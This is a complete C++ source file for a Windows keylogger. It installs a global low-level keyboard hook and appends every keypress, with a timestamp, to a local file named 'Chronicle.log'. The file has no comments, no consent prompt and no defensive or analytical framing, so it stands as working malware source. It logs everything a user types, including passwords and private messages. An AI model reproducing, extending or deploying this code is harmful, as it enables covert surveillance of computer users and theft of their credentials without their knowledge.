#define _WIN32_WINNT  0x1337
#include <fstream>
#include <windows.h>
#include <time.h>

using namespace std;

HHOOK keybdHook;

LRESULT CALLBACK KeybdHookProc( int, WPARAM, LPARAM );

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{

	MSG messages;
	
	keybdHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeybdHookProc, hInstance, 0 );
	
	while (GetMessage (&messages, NULL, 0, 0))
	{
		TranslateMessage(&messages);
		DispatchMessage(&messages);
	}
	
	UnhookWindowsHookEx( keybdHook );

	return messages.wParam;
}


LRESULT CALLBACK KeybdHookProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	
	if( wParam == WM_KEYDOWN )
	{
		
		time_t secs = time(0);
		tm *t = localtime( &secs );
		char timestamp[200]; 
		strftime( timestamp, sizeof(timestamp), "%m/%d/%Y %H:%M:%S", t );
		
		ofstream out("Chronicle.log", ios::app);
		
		out << timestamp << ": "; 
		
		switch (p->vkCode)
		{
			case 0xBE:			out << ".>";			break;
			case 0xC0:			out << "`~";			break;
			case 0xBD:			out << "-_";			break;
			case 0xBB:			out << "=+";			break;
			case 0xDE:			out << "'\"";			break;
			case 0xBA:			out << ";:";			break;
			case 0xBC:			out << ",<";			break;
			case 0xBF:			out << "/?";			break;
			case VK_BACK:		out << "[BACKSPACE]";	break;
			case VK_CAPITAL:	out << "[CAPLOCK]";		break;
			case VK_CLEAR:		out << "[CLEAR]";		break;
			case VK_CONTROL:	out << "[CONTROL]";		break;
			case VK_DELETE:		out << "[DEL]";			break;
			case VK_DOWN:		out << "[DOWN]";		break;
			case VK_END:		out << "[END]";			break;
			case VK_ESCAPE:		out << "[ESCAPE]";		break;
			case VK_F1:			out << "[F1]";			break;
			case VK_F2:			out << "[F2]";			break;
			case VK_F3:			out << "[F3]";			break;
			case VK_F4:			out << "[F4]";			break;
			case VK_F5:			out << "[F5]";			break;
			case VK_F6:			out << "[F6]";			break;
			case VK_F7:			out << "[F7]";			break;
			case VK_F8:			out << "[F8]";			break;
			case VK_F9:			out << "[F9]";			break;
			case VK_F10:		out << "[F10]";			break;
			case VK_F11:		out << "[F11]";			break;
			case VK_F12:		out << "[F12]";			break;
			case VK_HOME:		out << "[HOME]";		break;
			case VK_INSERT:		out << "[INSERT]";		break;
			case VK_LCONTROL:	out << "[LCTRL]";		break;
			case VK_LEFT:		out << "[LEFT]";		break;
			case VK_LSHIFT:		out << "[LSHIFT]";		break;
			case VK_LWIN:		out << "[LWIN]";		break;
			case VK_MENU:		out << "[ALT]";			break;
			case VK_NEXT:		out << "[PAGE DOWN]";	break;
			case VK_NUMLOCK:	out << "[NUMLOCK]";		break;
			case VK_NUMPAD0:	out << "[NUMPAD 0]";	break;
			case VK_NUMPAD1:	out << "[NUMPAD 1]";	break;
			case VK_NUMPAD2:	out << "[NUMPAD 2]";	break;
			case VK_NUMPAD3:	out << "[NUMPAD 3]";	break;
			case VK_NUMPAD4:	out << "[NUMPAD 4]";	break;
			case VK_NUMPAD5:	out << "[NUMPAD 5]";	break;
			case VK_NUMPAD6:	out << "[NUMPAD 6]";	break;
			case VK_NUMPAD7:	out << "[NUMPAD 7]";	break;
			case VK_NUMPAD8:	out << "[NUMPAD 8]";	break;
			case VK_NUMPAD9:	out << "[NUMPAD 9]";	break;
			case VK_PAUSE:		out << "[PAUSE]";		break;
			case VK_PRINT:		out << "[PRINT]";		break;
			case VK_PRIOR:		out << "[PAGE UP]";		break;
			case VK_RCONTROL:	out << "[RCTRL]";		break;
			case VK_RETURN:		out << "[ENTER]";		break;
			case VK_RIGHT:		out << "[RIGHT]";		break;
			case VK_RSHIFT:		out << "[RSHIFT]";		break;
			case VK_RWIN:		out << "[RWIN]";		break;
			case VK_SELECT:		out << "[SELECT]"; 		break;
			case VK_SHIFT:		out << "[SHIFT]";		break;
			case VK_SPACE:		out << "[SPACE]";		break;
			case VK_TAB:		out << "[TAB]";			break;
			case VK_UP:			out << "[UP]";			break;
			
			
			default:
					if( p->vkCode >= 39 && p->vkCode <= 64 )
						out << (char)(p->vkCode);
					else if( p->vkCode > 64 && p->vkCode < 91 )
						out << (char)(p->vkCode+32); 
					else
						out << "[" << p->vkCode << "]";
				break;
		}
		
		out << endl;
		
		out.close();
		
	}
	
	return CallNextHookEx( NULL, nCode, wParam, lParam );
	
}

